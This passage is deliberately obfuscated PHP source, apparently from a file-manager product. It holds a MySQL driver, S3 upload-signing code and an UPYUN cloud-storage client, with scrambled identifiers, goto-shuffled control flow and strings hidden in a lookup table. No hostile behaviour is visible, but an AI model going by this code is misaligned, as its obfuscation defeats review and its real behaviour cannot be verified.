(!extension_loaded($F‡Ñƒ»Ğ‰[767])) { think_exception(think_lang($F‡Ñƒ»Ğ‰[20]) . $F‡Ñƒ»Ğ‰[843]); } if (!empty($bíŞàò˜á)) { $this->config = $bíŞàò˜á; if (empty($this->config[$F‡Ñƒ»Ğ‰[23]])) { $this->config[$F‡Ñƒ»Ğ‰[23]] = $F‡Ñƒ»Ğ‰[43]; } } } public function connect($bÛÊ¼¿ÃÇ = '', $B…Ï¨Œ®ø = 0, $F•†ççŞ† = false) { $AšŸ¿š±ïÌ =& $_SERVER[£¶ä½¶¢]; if (!isset($this->linkID[$B…Ï¨Œ®ø])) { goto C¥Ê…ˆœÀË; C¥Ê…ˆœÀË: if (empty($bÛÊ¼¿ÃÇ)) { $bÛÊ¼¿ÃÇ = $this->config; } $c£×ÃŠÌ…ø = $bÛÊ¼¿ÃÇ[$AšŸ¿š±ïÌ[844]] . ($bÛÊ¼¿ÃÇ[$AšŸ¿š±ïÌ[845]] ? "\72{$bÛÊ¼¿ÃÇ[$AšŸ¿š±ïÌ[845]]}" : $AšŸ¿š±ïÌ[43]); $DïƒÇÇöƒ‰ = !empty($bÛÊ¼¿ÃÇ[$AšŸ¿š±ïÌ[23]][$AšŸ¿š±ïÌ[24]]) ? $bÛÊ¼¿ÃÇ[$AšŸ¿š±ïÌ[23]][$AšŸ¿š±ïÌ[24]] : $this->pconnect; goto Eˆ—©ÀùÅï; D‘©–†ô½: mysql_query($AšŸ¿š±ïÌ[848] . think_config($AšŸ¿š±ïÌ[849]) . $AšŸ¿š±ïÌ[65], $this->linkID[$B…Ï¨Œ®ø]); if ($d®ÀÜ‡¬  > $AšŸ¿š±ïÌ[850]) { mysql_query($AšŸ¿š±ïÌ[851], $this->linkID[$B…Ï¨Œ®ø]); } $this->connected = !0; goto AÉí§µÉà; AÉí§µÉà: if (1 != think_config($AšŸ¿š±ïÌ[28])) { unset($this->config); } goto EŸé¢’í’÷; Eˆ—©ÀùÅï: if ($DïƒÇÇöƒ‰) { $this->linkID[$B…Ï¨Œ®ø] = mysql_pconnect($c£×ÃŠÌ…ø, $bÛÊ¼¿ÃÇ[$AšŸ¿š±ïÌ[846]], $bÛÊ¼¿ÃÇ[$AšŸ¿š±ïÌ[847]], 131072); } else { $this->linkID[$B…Ï¨Œ®ø] = mysql_connect($c£×ÃŠÌ…ø, $bÛÊ¼¿ÃÇ[$AšŸ¿š±ïÌ[846]], $bÛÊ¼¿ÃÇ[$AšŸ¿š±ïÌ[847]], !0, 131072); } if (!$this->linkID[$B…Ï¨Œ®ø] || !empty($bÛÊ¼¿ÃÇ[$AšŸ¿š±ïÌ[27]]) && !mysql_select_db($bÛÊ¼¿ÃÇ[$AšŸ¿š±ïÌ[27]], $this->linkID[$B…Ï¨Œ®ø])) { think_exception(mysql_error()); } $d®ÀÜ‡¬  = mysql_get_server_info($this->linkID[$B…Ï¨Œ®ø]); goto D‘©–†ô½; EŸé¢’í’÷: } return $this->linkID[$B…Ï¨Œ®ø]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($BßÂ¯…•„») { goto Eæà¿ø¾×Š; FÒ¿¾‡¨Ü’: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto A‡²‡æ’ß‹; eæšµÊÙİ: if (!$this->_linkID) { return !1; } $this->queryStr = $BßÂ¯…•„»; if ($this->queryID) { $this->free(); } goto EÀª’…„‹ê; Eæà¿ø¾×Š: $açÖ…°–â =& $_SERVER[£¶ä½¶¢]; if (0 === stripos($BßÂ¯…•„», $açÖ…°–â[271])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto eæšµÊÙİ; EÀª’…„‹ê: think_action_status($açÖ…°–â[29], 1); think_status($açÖ…°–â[30]); $this->queryID = mysql_query($BßÂ¯…•„», $this->_linkID); goto FÒ¿¾‡¨Ü’; A‡²‡æ’ß‹: } public function execute($e§ÛŸÍŠŠø) { goto EâëÅÇ´ñ¼; E…’¨áˆ: $this->queryStr = $e§ÛŸÍŠŠø; if ($this->queryID) { $this->free(); } think_action_status($aÄó¸ß»ç[31], 1); goto C®—‡ÂÕÆÎ; EâëÅÇ´ñ¼: $aÄó¸ß»ç =& $_SERVER[£¶ä½¶¢]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto E…’¨áˆ; c«‹ÛƒÔâ: if (!1 === $D„ÏŠè¾‘Œ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto b‰¹ˆì¯£; C®—‡ÂÕÆÎ: think_status($aÄó¸ß»ç[30]); $D„ÏŠè¾‘Œ = mysql_query($e§ÛŸÍŠŠø, $this->_linkID); $this->debug(); goto c«‹ÛƒÔâ; b‰¹ˆì¯£: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[£¶ä½¶¢][852], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aŞ °¾¶À = mysql_query($_SERVER[£¶ä½¶¢][853], $this->_linkID); $this->transTimes = 0; if (!$aŞ °¾¶À) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $A‡É­ŒÓÃ· = mysql_query($_SERVER[£¶ä½¶¢][854], $this->_linkID); $this->transTimes = 0; if (!$A‡É­ŒÓÃ·) { $this->error(); return !1; } } return !0; } private function getAll() { $Cñëµ¸°‡Ê = array(); if ($this->numRows > 0) { while ($Aœ­¯ÖÇ¯Ü = mysql_fetch_assoc($this->queryID)) { $Cñëµ¸°‡Ê[] = $Aœ­¯ÖÇ¯Ü; } mysql_data_seek($this->queryID, 0); } return $Cñëµ¸°‡Ê; } public function getFields($eäğ“ßóÚ…) { $Cİ”‡î¯ =& $_SERVER[£¶ä½¶¢]; $dõà—šÙ»Â = $this->query($Cİ”‡î¯[855] . $this->parseKey($eäğ“ßóÚ…)); $a¿Õ“ãºĞ = array(); if ($dõà—šÙ»Â) { foreach ($dõà—šÙ»Â as $CÆ©‚ÍÄÙ™ => $d¹ªÅ‰) { $a¿Õ“ãºĞ[$d¹ªÅ‰[$Cİ”‡î¯[37]]] = array($Cİ”‡î¯[38] => $d¹ªÅ‰[$Cİ”‡î¯[37]], $Cİ”‡î¯[39] => $d¹ªÅ‰[$Cİ”‡î¯[40]], $Cİ”‡î¯[41] => (bool) (strtoupper($d¹ªÅ‰[$Cİ”‡î¯[42]]) === $Cİ”‡î¯[856]), $Cİ”‡î¯[44] => $d¹ªÅ‰[$Cİ”‡î¯[45]], $Cİ”‡î¯[46] => strtolower($d¹ªÅ‰[$Cİ”‡î¯[47]]) == $Cİ”‡î¯[48], $Cİ”‡î¯[49] => strtolower($d¹ªÅ‰[$Cİ”‡î¯[50]]) == $Cİ”‡î¯[51]); } } return $a¿Õ“ãºĞ; } public function getTables($E³ñäÛ¥–â = '') { $DË¬†ˆ¡å =& $_SERVER[£¶ä½¶¢]; if (!empty($E³ñäÛ¥–â)) { $AğöêŒè¥ = $DË¬†ˆ¡å[857] . $E³ñäÛ¥–â . $DË¬†ˆ¡å[858]; } else { $AğöêŒè¥ = $DË¬†ˆ¡å[859]; } $f´Æ×ÖÓºŠ = $this->query($AğöêŒè¥); $bˆ‚»ìÒù = array(); foreach ($f´Æ×ÖÓºŠ as $eÙ•ØïŠø => $aæÔÕà±‡) { $bˆ‚»ìÒù[$eÙ•ØïŠø] = current($aæÔÕà±‡); } return $bˆ‚»ìÒù; } public function replace($a‘³Œö“÷, $cîÛàŞ×îÄ = array()) { $AàÖò×íñÙ =& $_SERVER[£¶ä½¶¢]; foreach ($a‘³Œö“÷ as $b£…ğÚ‰¸ => $F´¦ÀˆË©„) { $A¸†’áÇ’“ = $this->parseValue($F´¦ÀˆË©„); if (is_scalar($A¸†’áÇ’“)) { $Aµ—œ»Œêà[] = $A¸†’áÇ’“; $D‰¦­ìİì[] = $this->parseKey($b£…ğÚ‰¸); } } $aÏÆ’…ÕŞ = $AàÖò×íñÙ[860] . $this->parseTable($cîÛàŞ×îÄ[$AàÖò×íñÙ[286]]) . $AàÖò×íñÙ[861] . implode($AàÖò×íñÙ[57], $D‰¦­ìİì) . $AàÖò×íñÙ[862] . implode($AàÖò×íñÙ[57], $Aµ—œ»Œêà) . $AàÖò×íñÙ[863]; return $this->execute($aÏÆ’…ÕŞ); } public function insertAll($Dì¦Œ‘÷½´, $c•ĞÛä‹¿ = array(), $f†°«òÏâ½ = false) { goto câÇËœÔºƒ; câÇËœÔºƒ: $b…¤‘­Ê­ =& $_SERVER[£¶ä½¶¢]; if (!is_array($Dì¦Œ‘÷½´[0])) { return !1; } $cÚƒÇÇ‹Ú¼ = array_keys($Dì¦Œ‘÷½´[0]); goto bÎä¤·É†é; bÎä¤·É†é: $F¡ÙªÛñÇé = array(); foreach ($Dì¦Œ‘÷½´ as $b½ùÅó›˜Å) { $Eï •‘İŒ… = array(); foreach ($b½ùÅó›˜Å as $f«—Ò„¿‹ => $Aš­¦ô‘™¶) { $Aš­¦ô‘™¶ = $this->parseValue($Aš­¦ô‘™¶); if (is_scalar($Aš­¦ô‘™¶)) { $Eï •‘İŒ…[] = $Aš­¦ô‘™¶; } } $F¡ÙªÛñÇé[] = $b…¤‘­Ê­[267] . implode($b…¤‘­Ê­[57], $Eï •‘İŒ…) . $b…¤‘­Ê­[863]; } array_walk($cÚƒÇÇ‹Ú¼, array($this, $b…¤‘­Ê­[864])); goto eµô¤ƒ•õ‡; eµô¤ƒ•õ‡: $EĞâà­¡ÂÃ = ($f†°«òÏâ½ ? $b…¤‘­Ê­[865] : $b…¤‘­Ê­[866]) . $b…¤‘­Ê­[867] . $this->parseTable($c•ĞÛä‹¿[$b…¤‘­Ê­[286]]) . $b…¤‘­Ê­[861] . implode($b…¤‘­Ê­[57], $cÚƒÇÇ‹Ú¼) . $b…¤‘­Ê­[868] . implode($b…¤‘­Ê­[57], $F¡ÙªÛñÇé); return $this->execute($EĞâà­¡ÂÃ); goto e†ù¸šåòª; e†ù¸šåòª: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $DæíÀÔ³Œ =& $_SERVER[£¶ä½¶¢]; $this->error = mysql_errno() . $DæíÀÔ³Œ[14] . mysql_error($this->_linkID); if ($DæíÀÔ³Œ[43] != $this->queryStr) { $this->error .= LNG($DæíÀÔ³Œ[55]) . $this->queryStr; } think_trace($this->error, $DæíÀÔ³Œ[43], $DæíÀÔ³Œ[56]); return $this->error; } public function escapeString($EÒ…‡œó¨) { if ($this->_linkID) { return mysql_real_escape_string($EÒ…‡œó¨, $this->_linkID); } else { return mysql_escape_string($EÒ…‡œó¨); } } public function parseKey(&$Dîíò°˜À, $f­Ô¾ÅùÍª = true) { $BŒ×…½Ğøà =& $_SERVER[£¶ä½¶¢]; if ($f­Ô¾ÅùÍª) { $Dîíò°˜À = $this->parseKeyCheck($Dîíò°˜À); } if ($Dîíò°˜À != $BŒ×…½Ğøà[192] && !preg_match($BŒ×…½Ğøà[869], $Dîíò°˜À)) { $Dîíò°˜À = $BŒ×…½Ğøà[390] . trim($Dîíò°˜À, $BŒ×…½Ğøà[390]) . $BŒ×…½Ğøà[390]; } return $Dîíò°˜À; } } goto D³ÊÌ§êÌ; c¨åÌğ™Ì: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($CŒïêµä«‘) { parent::__construct($CŒïêµä«‘); } public function uploadFormData($Dš¸¡ŸÒÍÈ, $cîáï·Ì·Å = 3600) { goto e¡¿Ëø„ì”; e¡¿Ëø„ì”: $fƒ¿İ‰À½ =& $_SERVER[£¶ä½¶¢]; $B¹÷ï¨´ƒ = $fƒ¿İ‰À½[202]; $aèÒ½­åèŞ = $fƒ¿İ‰À½[1221]; goto f½ë·³íéó; e³‚Š¦Ù¦: $BùŸÆí‘İ = base64_encode(json_encode($E¿¦±ÜÕù·)); $báÈ—Ğ‰…ğ = hash_hmac($fƒ¿İ‰À½[1231], $dùºÎ¤†ÂŒ, $fƒ¿İ‰À½[1232] . $this->secret, !0); $aª¸•ÑŸÕ¥ = hash_hmac($fƒ¿İ‰À½[1231], $this->region, $báÈ—Ğ‰…ğ, !0); goto e‰İÇ‘éäâ; fÑ¡ê£ìŠì: $b»Îİ› ¤ = array($fƒ¿İ‰À½[221] => $fƒ¿İ‰À½[43], $fƒ¿İ‰À½[1233] => $fƒ¿İ‰À½[43], $fƒ¿İ‰À½[1190] => $B¹÷ï¨´ƒ, $fƒ¿İ‰À½[1194] => $DÛ’ë„¡ë, $fƒ¿İ‰À½[1198] => $BùŸÆí‘İ, $fƒ¿İ‰À½[1234] => $Däª¹À»ºŒ, $fƒ¿İ‰À½[1235] => $aèÒ½­åèŞ, $fƒ¿İ‰À½[1236] => $Béçôà¡ÒÜ, $fƒ¿İ‰À½[1237] => $C°î±ó†éÇ, $fƒ¿İ‰À½[1238] => $b×šğÅèŒÃ, $fƒ¿İ‰À½[185] => $this->getHost()); return $b»Îİ› ¤; goto A³ÑœòËŒÎ; FººäíˆÙ¶: $A‰ªÎ¢Â²ƒ = $fƒ¿İ‰À½[1223]; $C°î±ó†éÇ = $cîáï·Ì·Å . $fƒ¿İ‰À½[43]; $DÛ’ë„¡ë = $fƒ¿İ‰À½[1186]; goto f›ôØ¡±óÉ; f½ë·³íéó: $C‚ÍñÙ§×ó = $fƒ¿İ‰À½[69]; $Béçôà¡ÒÜ = gmdate($fƒ¿İ‰À½[1222]); $dùºÎ¤†ÂŒ = gmdate($fƒ¿İ‰À½[719]); goto FººäíˆÙ¶; e‰İÇ‘éäâ: $CÂ‘‹¡Øê‡ = hash_hmac($fƒ¿İ‰À½[1231], $C‚ÍñÙ§×ó, $aª¸•ÑŸÕ¥, !0); $b´è‹Ëåš = hash_hmac($fƒ¿İ‰À½[1231], $A‰ªÎ¢Â²ƒ, $CÂ‘‹¡Øê‡, !0); $b×šğÅèŒÃ = hash_hmac($fƒ¿İ‰À½[1231], $BùŸÆí‘İ, $b´è‹Ëåš); goto fÑ¡ê£ìŠì; f›ôØ¡±óÉ: $EÄó¶–Ü‡‘ = array($this->accessKey, $dùºÎ¤†ÂŒ, $this->region, $C‚ÍñÙ§×ó, $A‰ªÎ¢Â²ƒ); $Däª¹À»ºŒ = implode($fƒ¿İ‰À½[18], $EÄó¶–Ü‡‘); $E¿¦±ÜÕù· = array($fƒ¿İ‰À½[1188] => gmdate($fƒ¿İ‰À½[1187], strtotime($fƒ¿İ‰À½[1224])), $fƒ¿İ‰À½[1189] => array(array($fƒ¿İ‰À½[1191] => $this->bucket), array($fƒ¿İ‰À½[1190] => $B¹÷ï¨´ƒ), array($fƒ¿İ‰À½[1192], $fƒ¿İ‰À½[1193], $fƒ¿İ‰À½[43]), array($fƒ¿İ‰À½[1192], $fƒ¿İ‰À½[1225], $fƒ¿İ‰À½[43]), array($fƒ¿İ‰À½[1192], $fƒ¿İ‰À½[1226], $fƒ¿İ‰À½[43]), array($fƒ¿İ‰À½[1194] => $DÛ’ë„¡ë), array($fƒ¿İ‰À½[1227] => $Däª¹À»ºŒ), array($fƒ¿İ‰À½[1228] => $aèÒ½­åèŞ), array($fƒ¿İ‰À½[1229] => $Béçôà¡ÒÜ), array($fƒ¿İ‰À½[1230] => $C°î±ó†éÇ))); goto e³‚Š¦Ù¦; A³ÑœòËŒÎ: } public function multiUploadFormData($eªæ¯ğÑà, $B°¤àÙäÌÖ = 3600) { $f·Â‰š¯í =& $_SERVER[£¶ä½¶¢]; $fÎîøï»ùô = gmdate($f·Â‰š¯í[1316]); $EáÂ‹¼¨“ = array(); $D¯Ø¦íƒ• = $this->client->getUploadId($this->bucket, $eªæ¯ğÑà, $EáÂ‹¼¨“); if (!$D¯Ø¦íƒ•) { return !1; } return array($f·Â‰š¯í[231] => $D¯Ø¦íƒ•, $f·Â‰š¯í[185] => $this->getHost() . $f·Â‰š¯í[18] . $this->pathEncode($eªæ¯ğÑà), $f·Â‰š¯í[232] => $fÎîøï»ùô, $f·Â‰š¯í[103] => $eªæ¯ğÑà); } public function multiUploadAuthData($a³ó‰çí§¨, $cïÆŠİø“Ë = array()) { goto BéÊÓæÆ‚§; D‹ÁÀï…äÆ: unset($cïÆŠİø“Ë[$Eê¶„¸âÚ[103]]); if (isset($cïÆŠİø“Ë[$Eê¶„¸âÚ[233]])) { return $this->listUploadParts($b‘ƒÁÁ‡›¿, $cïÆŠİø“Ë); } $d¨âÈÕƒÀÙ = array(); goto C‰‚ŒÊèÜ; BéÊÓæÆ‚§: $Eê¶„¸âÚ =& $_SERVER[£¶ä½¶¢]; $CÃ±Å¢ÆÄÆ = isset($cïÆŠİø“Ë[$Eê¶„¸âÚ[178]]) ? $cïÆŠİø“Ë[$Eê¶„¸âÚ[178]] : $Eê¶„¸âÚ[43]; $b‘ƒÁÁ‡›¿ = $cïÆŠİø“Ë[$Eê¶„¸âÚ[103]]; goto D‹ÁÀï…äÆ; bÚÌÁĞà„ê: if (strpos($CÃ±Å¢ÆÄÆ, $Eê¶„¸âÚ[235]) === 0) { if (isset($d¨âÈÕƒÀÙ[$Eê¶„¸âÚ[1318]])) { $bğ‡åİŒ¥ = $d¨âÈÕƒÀÙ[$Eê¶„¸âÚ[1318]]; } else { if (isset($AÈâ•Ï—½™[$Eê¶„¸âÚ[1318]])) { $bğ‡åİŒ¥ = $AÈâ•Ï—½™[$Eê¶„¸âÚ[1318]]; } else { $bğ‡åİŒ¥ = hash($Eê¶„¸âÚ[1231], $Eê¶„¸âÚ[43]); } } return array($Eê¶„¸âÚ[241] => $AÈâ•Ï—½™[$Eê¶„¸âÚ[241]], $Eê¶„¸âÚ[1318] => $bğ‡åİŒ¥, $Eê¶„¸âÚ[232] => $AÈâ•Ï—½™[$Eê¶„¸âÚ[1321]]); } return $AÈâ•Ï—½™[$Eê¶„¸âÚ[241]]; goto C Á‚ô„ã; C‰‚ŒÊèÜ: if (isset($cïÆŠİø“Ë[$Eê¶„¸âÚ[1317]])) { $d¨âÈÕƒÀÙ[$Eê¶„¸âÚ[1318]] = $cïÆŠİø“Ë[$Eê¶„¸âÚ[1317]]; } $c…ò¹ÔŸ–Ì = explode($Eê¶„¸âÚ[187], $this->getHost()); $d’îÅ ö„Â = array($Eê¶„¸âÚ[1319] => $c…ò¹ÔŸ–Ì[1], $Eê¶„¸âÚ[1320] => $Eê¶„¸âÚ[43], $Eê¶„¸âÚ[221] => $Eê¶„¸âÚ[129], $Eê¶„¸âÚ[1233] => $cïÆŠİø“Ë[$Eê¶„¸âÚ[88]]); goto F…ôÃÂ‡í¯; F…ôÃÂ‡í¯: $C·‹œ—¨Ÿç = $Eê¶„¸âÚ[236]; $CïÏˆÉÚ•Â = $Eê¶„¸âÚ[18] . $this->pathEncode($b‘ƒÁÁ‡›¿) . $CÃ±Å¢ÆÄÆ; $AÈâ•Ï—½™ = $this->client->__getSignatureV4($d¨âÈÕƒÀÙ, $d’îÅ ö„Â, $C·‹œ—¨Ÿç, $CïÏˆÉÚ•Â); goto bÚÌÁĞà„ê; C Á‚ô„ã: } public function listUploadParts($bÛ†¥½­¤, $AÛ­µôÒÉÏ = array()) { goto AÚ³ÏÓÉ¿Ú; AÚ³ÏÓÉ¿Ú: $C’È‰ïİæ =& $_SERVER[£¶ä½¶¢]; $C‚¤„ÒÁÇ° = str_replace($C’È‰ïİæ[242], $C’È‰ïİæ[43], $AÛ­µôÒÉÏ[$C’È‰ïİæ[178]]); $EßÎÔÁ›Ùù = $this->client->listParts($this->bucket, $bÛ†¥½­¤, $C‚¤„ÒÁÇ°); goto E÷ñ™ Ú—; E÷ñ™ Ú—: if (!$EßÎÔÁ›Ùù) { return !1; } $b¬¿æŠ‡´í = $C’È‰ïİæ[1322]; foreach ($EßÎÔÁ›Ùù as $BùØ±¨‹•‹) { $b¬¿æŠ‡´í .= $C’È‰ïİæ[1323] . "\74\120\141\x72\164\116\165\155\x62\x65\162\x3e{$BùØ±¨‹•‹[$C’È‰ïİæ[1278]]}\74\57\120\141\162\x74\116\165\155\x62\145\162\x3e\xa" . "\x3c\105\124\x61\x67\x3e{$BùØ±¨‹•‹[$C’È‰ïİæ[1279]]}\x3c\57\x45\124\x61\x67\x3e\12" . $C’È‰ïİæ[1324]; } goto B††ö¦‹ÀĞ; B††ö¦‹ÀĞ: $b¬¿æŠ‡´í .= $C’È‰ïİæ[1325]; $a…Ò›Ÿæ· = array(); $D¡¡×Œ˜Õ = explode($C’È‰ïİæ[187], $this->getHost()); goto d¼ê‚‘Âèƒ; EéğÌè×„: $dŒÅÔŸ™Ú› = $this->client->__getSignatureV4($a…Ò›Ÿæ·, $AÔ˜¥™Ü¡, $BîÃ‡§¸, $A°Œ›Ü„Ğ, $b¬¿æŠ‡´í); return array($C’È‰ïİæ[241] => $dŒÅÔŸ™Ú›[$C’È‰ïİæ[241]], $C’È‰ïİæ[232] => $dŒÅÔŸ™Ú›[$C’È‰ïİæ[1321]], $C’È‰ïİæ[243] => $EßÎÔÁ›Ùù, $C’È‰ïİæ[1318] => $dŒÅÔŸ™Ú›[$C’È‰ïİæ[1318]]); goto C¦ôÕ‹‹˜; d¼ê‚‘Âèƒ: $AÔ˜¥™Ü¡ = array($C’È‰ïİæ[1319] => $D¡¡×Œ˜Õ[1], $C’È‰ïİæ[221] => $C’È‰ïİæ[129], $C’È‰ïİæ[1233] => strlen($b¬¿æŠ‡´í)); $BîÃ‡§¸ = $C’È‰ïİæ[234]; $A°Œ›Ü„Ğ = $C’È‰ïİæ[18] . $this->pathEncode($bÛ†¥½­¤) . $AÛ­µôÒÉÏ[$C’È‰ïİæ[178]]; goto EéğÌè×„; C¦ôÕ‹‹˜: } public function link($E´¢ÛÃë´, $e‡‹†¥Ò®à = array()) { return parent::link($E´¢ÛÃë´, $e‡‹†¥Ò®à); } public function fileOut($dò°ƒÌ˜ÀÆ, $AìŞ‘»©ºé = false, $CÑ—‘‘³¹á = false, $B«‡Ÿ¡—Ÿƒ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[£¶ä½¶¢][1326])) { return parent::fileOutServer($dò°ƒÌ˜ÀÆ, $AìŞ‘»©ºé, $CÑ—‘‘³¹á, $B«‡Ÿ¡—Ÿƒ); } parent::fileOut($dò°ƒÌ˜ÀÆ, $AìŞ‘»©ºé, $CÑ—‘‘³¹á, $B«‡Ÿ¡—Ÿƒ); } public function fileOutImage($F£ÁÚ‘òá×, $DŠñËÖÂ‡ˆ = 250) { if (strstr($this->endpoint, $_SERVER[£¶ä½¶¢][1326])) { return parent::fileOutImageServer($F£ÁÚ‘òá×, $DŠñËÖÂ‡ˆ); } parent::fileOutImage($F£ÁÚ‘òá×, $DŠñËÖÂ‡ˆ); } public function fileOutLink($CÉÅ–‚µêÌ) { $CÚİõÎÃØƒ =& $_SERVER[£¶ä½¶¢]; if (substr($CÉÅ–‚µêÌ, 0, 7) == $CÚİõÎÃØƒ[1201]) { $CÉÅ–‚µêÌ = $CÚİõÎÃØƒ[1202] . substr($CÉÅ–‚µêÌ, 7); } header($CÚİõÎÃØƒ[169] . $CÉÅ–‚µêÌ); die; } public function getHost() { $cºË¤šè™¾ =& $_SERVER[£¶ä½¶¢]; $bßÙøğÔ…ğ = str_rtrim(parent::getHost(), $cºË¤šè™¾[18] . $this->bucket); $bßÙøğÔ…ğ = explode($cºË¤šè™¾[187], $bßÙøğÔ…ğ); return $bßÙøğÔ…ğ[0] . $cºË¤šè™¾[187] . $this->bucket . $cºË¤šè™¾[105] . $bßÙøğÔ…ğ[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($E‘éèª™õè, $FÙ¤ŸßÂ±… = 0) { parent::__construct(); $this->source = $E‘éèª™õè; $this->sourceSize = $FÙ¤ŸßÂ±…; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($b¢™Í¯“ŸŒ = false) { return $this->sourceSize; } public function getContent($cŒÉˆ‹ƒ² = false) { return $this->fileSubstr($cŒÉˆ‹ƒ², 0, $this->sourceSize); } public function fileSubstr($cóøóŠœÆ = false, $EØÀÍæŠî¯ = 0, $aÈ—ˆÑ¼· = 0) { if (!$aÈ—ˆÑ¼·) { $aÈ—ˆÑ¼· = $this->sourceSize; } $e¥‡ÎâôÇÒ = $this->sourceSize - $EØÀÍæŠî¯; if ($aÈ—ˆÑ¼· >= $e¥‡ÎâôÇÒ) { $aÈ—ˆÑ¼· = $e¥‡ÎâôÇÒ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $EØÀÍæŠî¯, $aÈ—ˆÑ¼·); } if ($this->sourceType == self::TYPE_FILE) { if ($aÈ—ˆÑ¼· <= 0) { return $_SERVER[£¶ä½¶¢][43]; } $E¯§ÎÇäÁ = ftell($this->source); fseek_64($this->source, $E¯§ÎÇäÁ + $EØÀÍæŠî¯); $CÀàĞ»‰”Ş = @fread($this->source, $aÈ—ˆÑ¼·); fseek_64($this->source, $E¯§ÎÇäÁ); return $CÀàĞ»‰”Ş; } } public function hashMd5($CîºÚ¥Óƒ = false) { return md5($this->getContent()); } public static function hash($c‘·‡È¿š, $CèÓ¸¿–ô = 0) { $e°‚­ğ°°¯ = new PathDriverStream($c‘·‡È¿š, $CèÓ¸¿–ô); return $e°‚­ğ°°¯->hashSimple($c‘·‡È¿š); } public static function md5($e–Éí†£ö¯, $eÆ¬¼¾öŒ = 0) { $f‹‰ÅÖ‘š = new PathDriverStream($e–Éí†£ö¯, $eÆ¬¼¾öŒ); return $f‹‰ÅÖ‘š->hashMd5($e–Éí†£ö¯); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\x70\72\x2f\x2f\x76\60\56\141\x70\x69\x2e\165\160\x79\165\156\x2e\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($FØ¿Ššë–) { parent::__construct(); $this->_init($FØ¿Ššë–); } public function _init($A¢êÛ‡éÙÚ) { $a§ŞóëŞñ =& $_SERVER[£¶ä½¶¢]; foreach ($A¢êÛ‡éÙÚ as $fõ½±©ÇİÀ => $b¿Ï÷ğ°Ã‘) { if (isset($this->{$fõ½±©ÇİÀ})) { $this->{$fõ½±©ÇİÀ} = $b¿Ï÷ğ°Ã‘; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($a§ŞóëŞñ[1327] . LNG($a§ŞóëŞñ[1259])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($BïÙÄÂê, $D«ŠÓà»¿ë = "\x47\x45\124") { $Cë¶é®Çğ =& $_SERVER[£¶ä½¶¢]; $A›‡æ¦ İ¹ = gmdate($Cë¶é®Çğ[1293]); $cİ”œ¸é¯ = base64_encode(hash_hmac($Cë¶é®Çğ[1328], "{$D«ŠÓà»¿ë}\x26{$BïÙÄÂê}\46{$A›‡æ¦ İ¹}", md5("{$this->userpass}"), !0)); $a•ã‰ÀíİÂ = array("\101\x75\164\150\157\162\x69\172\141\x74\x69\x6f\x6e\72\x55\120\131\125\116\x20{$this->username}\72{$cİ”œ¸é¯}", "\104\x61\164\145\x3a{$A›‡æ¦ İ¹}"); return $a•ã‰ÀíİÂ; } public function ussRequest($eÉ»‚¸²ê, $Fè¡’Øãñ = "\107\105\124", $bÜÄİ¤áÊ = false, $Cä½Âö—¡ = false, $B¿ğ²ğ¸´¼ = false) { goto eË¾ÑãÙ¹ê; C¹ôÄà: $dİÁŞ™·ö¥ = $this->ussHeaders($b—ÉÅÙºË, $Fè¡’Øãñ); if ($Cä½Âö—¡) { $dİÁŞ™·ö¥ = array_merge($dİÁŞ™·ö¥, $Cä½Âö—¡); } $B…³¶…¦ñ = url_request($this->endpoint . $b—ÉÅÙºË, $Fè¡’Øãñ, $bÜÄİ¤áÊ, $dİÁŞ™·ö¥, $B¿ğ²ğ¸´¼); goto e‘Ãš²¸Ö‚; e‘Ãš²¸Ö‚: if (!$B…³¶…¦ñ) { return array($C‰¬Ö¢×Î[1084] => !1, $C‰¬Ö¢×Î[1086] => $C‰¬Ö¢×Î[1329]); } if (strtolower($Fè¡’Øãñ) == $C‰¬Ö¢×Î[200] || in_array($B…³¶…¦ñ[$C‰¬Ö¢×Î[1084]], array($C‰¬Ö¢×Î[1186], $C‰¬Ö¢×Î[1330]))) { $bÜÄİ¤áÊ = $B…³¶…¦ñ[$C‰¬Ö¢×Î[1331]]; } else { $bÜÄİ¤áÊ = json_decode($B…³¶…¦ñ[$C‰¬Ö¢×Î[1086]], !0); if (!$bÜÄİ¤áÊ) { $bÜÄİ¤áÊ = $B…³¶…¦ñ[$C‰¬Ö¢×Î[1086]]; } else { if (!$B…³¶…¦ñ[$C‰¬Ö¢×Î[718]] && isset($bÜÄİ¤áÊ[$C‰¬Ö¢×Î[1332]])) { $bÜÄİ¤áÊ = $bÜÄİ¤áÊ[$C‰¬Ö¢×Î[1332]]; } } } return array($C‰¬Ö¢×Î[1084] => $B…³¶…¦ñ[$C‰¬Ö¢×Î[718]], $C‰¬Ö¢×Î[1086] => $bÜÄİ¤áÊ); goto A­ÁÃÍğêê; eË¾ÑãÙ¹ê: $C‰¬Ö¢×Î =& $_SERVER[£¶ä½¶¢]; $eÉ»‚¸²ê = trim($eÉ»‚¸²ê, $C‰¬Ö¢×Î[18]); $b—ÉÅÙºË = "\x2f{$this->bucket}\57{$eÉ»‚¸²ê}"; goto C¹ôÄà; 